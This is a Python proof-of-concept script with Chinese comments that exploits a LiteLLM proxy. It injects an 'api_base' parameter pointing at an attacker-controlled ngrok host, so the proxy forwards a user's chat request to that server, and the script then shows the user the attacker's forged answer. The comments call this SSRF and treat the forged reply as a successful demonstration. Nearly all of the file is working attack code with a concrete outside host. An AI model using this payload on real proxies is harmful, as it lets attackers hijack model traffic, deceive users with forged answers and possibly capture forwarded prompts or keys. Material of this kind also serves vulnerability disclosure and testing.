# user_simulator.py
import requests
import json
import sys

# --- 配置 ---
# !! 重要：请将下面的 URL 替换为您自己的、正在运行的 ngrok HTTPS 地址 !!
MALICIOUS_API_BASE = "https://supermundane-demonologically-tamatha.ngrok-free.dev" 
LITELLM_PROXY_URL = "http://127.0.0.1:4000/chat/completions"

def run_simulation():
    """模拟一个真实用户向代理提问并接收回答的全过程。"""
    
    if "xxxxxxxx" in MALICIOUS_API_BASE:
        print("错误：请先在脚本中将被攻击的 'MALICIOUS_API_BASE' 替换为您自己的 ngrok 地址！")
        return

    user_question = "你好，请给我讲一个关于太空的笑话。"
    
    print("--- 用户模拟程序启动 ---")
    print(f"用户提问：'{user_question}'")
    print(f"正在向 LiteLLM 代理 ({LITELLM_PROXY_URL}) 发送请求...")
    print("-" * 25)

    # 构建包含恶意 api_base 的请求体
    payload = {
        "model": "gpt-3.5-turbo",
        "messages": [
            {"role": "user", "content": user_question}
        ],
        "stream": True,
        "api_base": MALICIOUS_API_BASE # 注入恶意地址，触发 SSRF
    }

    try:
        # 发送流式请求
        response = requests.post(LITELLM_PROXY_URL, json=payload, stream=True)
        response.raise_for_status() # 如果请求失败 (如 4xx, 5xx 错误)，则抛出异常

        print("模型的回答是：")
        # 实时处理并打印流式响应
        for line in response.iter_lines():
            if line:
                decoded_line = line.decode('utf-8')
                if decoded_line.startswith('data: '):
                    json_str = decoded_line[6:]
                    if json_str.strip() != "[DONE]":
                        try:
                            chunk = json.loads(json_str)
                            content = chunk['choices'][0]['delta'].get('content', '')
                            print(content, end='', flush=True)
                        except json.JSONDecodeError:
                            continue # 忽略无法解析的行
        print("\n") # 结束时换行

    except requests.exceptions.RequestException as e:
        print(f"\n[错误] 连接到 LiteLLM 代理失败: {e}")
        print("请确保 LiteLLM 代理正在 http://127.0.0.1:4000 运行。")
    
    print("-" * 25)
    print("--- 模拟结束 ---")
    print("演示成功：用户看到了被攻击者完全操控的回答，而不是真实模型的回答。")

if __name__ == "__main__":
    run_simulation()
